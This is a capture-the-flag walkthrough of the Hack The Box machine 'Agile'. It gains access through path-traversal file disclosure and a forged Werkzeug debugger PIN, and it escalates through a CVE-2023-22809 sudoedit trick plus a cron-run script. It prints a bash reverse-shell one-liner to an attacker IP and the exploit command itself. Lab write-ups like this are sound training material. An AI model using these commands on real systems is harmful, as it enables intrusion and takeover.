🚀 HTB: Agile – Full Walkthrough

🧠 TL;DR

    File disclosure vulnerability exploited for initial foothold

    Werkzeug debugger PIN generated to access Python console → reverse shell

    MySQL credentials extracted via disclosed config

    Port forwarding unlocked remote debug interface → user credential discovery

    Privilege escalation via misconfigured sudo and CVE-2023-22809 exploit

    Root achieved through malicious shell injection into a cron-executed script

🔍 Reconnaissance & Initial Access

Performed standard enumeration using nmap:

nmap -sC -sV -v <target-ip>

Result: No significant services exposed.

On visiting the site hosted on port 80, I encountered a login page. Out of curiosity, I attempted to access /register and was surprised to find an active registration page — likely discoverable via gobuster or feroxbuster.

After registering and logging in, I was redirected to a /vault page.
📁 File Disclosure Exploitation

On the /vault page, I tested for SSTI but it didn’t yield results.

I then intercepted the export/download request via BurpSuite and tested with:

../../../../../../../etc/passwd

Success! The app was vulnerable to a file disclosure vulnerability. This allowed quick inspection of any file on the server via crafted download requests.
🔓 Werkzeug Debug Console Access

I noticed a console icon in the browser UI — indicating a Werkzeug debugger running in production.

The console was PIN-protected.

I followed HackTricks guidance and retrieved necessary components to generate a valid Werkzeug console PIN, using the file disclosure to collect:

    Username (www-data) from /proc/self/environ

    MAC address from /sys/class/net/eth0/address

    Device ID from /proc/net/arp

    Machine ID from /etc/machine-id

    App path (from browser source hints)

Once all parameters were fed into the PIN-generation script, I successfully unlocked the debugger console.
⚙️ Gaining Shell Access

Using the unlocked Werkzeug console, I ran:

import os
os.system("/bin/bash -c 'bash -i >& /dev/tcp/<attacker-ip>/<port> 0>&1'")

✅ Reverse shell landed as www-data.
🐚 Credential Discovery via File Disclosure

While exploring environment variables, I found reference to:

/app/config_prod.json

Inside this config file were MySQL credentials:

    Username: superpassuser

    Password: (retrieved)

Logged into MySQL and found a database: superpass, which held users and passwords tables.

Exported both and mapped usernames to passwords by aligning record order. Used CrackMapExec (CME) to test these credentials.

Got a valid hit:

ssh corum@<target-ip>

✔️ Shell as corum
🛠 Remote Debug Port & Port Forwarding

While enumerating further, I found test_site_interactively.py, referencing a debug port 41829.

Verified port availability, then initiated local port forwarding via:

<ALT GR> + ~  then CTRL + C

Accessed the port in Chromium:

    Open chrome://inspect

    Configure → add localhost:41829

    Click “Inspect”

Navigated to /vault on the target domain test.superpass.htb, and surprisingly discovered SSH credentials for user edwards.
🔐 SSH as Edwards & Privilege Escalation

Logged in as edwards. Checked sudo -l and found commands restricted to dev_admin group.

Searched for files owned by dev_admin, found /app/venv/bin/activate, which is invoked by:

/app/test_and_update.sh

Used a crafted sudoedit trick (based on CVE-2023-22809):

EDITOR="vim -- /app/venv/bin/activate" sudoedit -u dev_admin /app/app-testing/tests/functional/creds.txt

Injected a bash reverse shell payload into activate.
⏱️ Cronjob Trigger to Root

Waited for the system to execute the script via a cronjob.

✔️ Reverse shell landed as root
🧠 Key Learnings & Techniques
Step	Technique
Initial Access	File Disclosure → Werkzeug console unlock
Privilege Escalation	Misconfigured sudo + cron + CVE-2023-22809
Tools Used	BurpSuite, HackTricks, CrackMapExec, Chromium (inspect), Vim, Port Forwarding
Reverse Shell	Bash one-liner via Werkzeug & script injection
🏁 Summary

    ✅ Enumerated login and registration endpoints

    ✅ Discovered file disclosure and extracted sensitive files

    ✅ Accessed Werkzeug console via reverse-engineered PIN

    ✅ Leveraged exposed config for MySQL credentials

    ✅ Port-forwarded to internal service to extract further credentials

    ✅ Abused sudo misconfig and cron for root access

🎉 Rooted: HTB Agile

User Flags: ✅
Root Flags: ✅
Difficulty: Medium
Techniques: Clean, realistic, post-exploitation-heavy
